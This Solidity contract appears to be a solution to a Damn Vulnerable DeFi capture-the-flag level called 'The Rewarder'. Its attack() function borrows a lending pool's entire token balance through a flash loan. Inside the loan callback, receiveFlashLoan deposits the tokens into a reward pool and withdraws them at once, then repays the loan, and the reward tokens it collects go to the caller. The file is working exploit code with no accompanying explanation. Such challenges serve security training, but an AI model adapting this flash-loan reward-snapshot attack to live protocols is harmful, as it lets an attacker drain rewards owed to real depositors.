// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IRewardToken {
    function transfer(address to, uint256 amount) external returns(bool);
    function balanceOf(address account) external view returns(uint256);
}

interface IDamnValuableToken {
    function balanceOf(address account) external view returns(uint256);
    function approve(address spender, uint256 amount) external returns(bool);
    function transfer(address to, uint256 amount) external returns(bool);
}

contract RewarderChallenge {
    IFlashLoanerPool loanPool;
    ITheRewarderPool rewarderPool;
    IDamnValuableToken dvt;
    IRewardToken rewardToken;

    constructor(address _loanPool, address _rewarderPool, address _dvt, address _rewardToken) {
        loanPool = IFlashLoanerPool(_loanPool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        dvt = IDamnValuableToken(_dvt);
        rewardToken = IRewardToken(_rewardToken);
    }

    function attack() external {
        uint loanPoolBalance = dvt.balanceOf(address(loanPool));
        loanPool.flashLoan(loanPoolBalance);
        uint rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardBalance);
    }

    function receiveFlashLoan(uint256 _amount) external {
        dvt.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);
        dvt.transfer(address(loanPool), _amount);
    }

    receive() external payable {}
}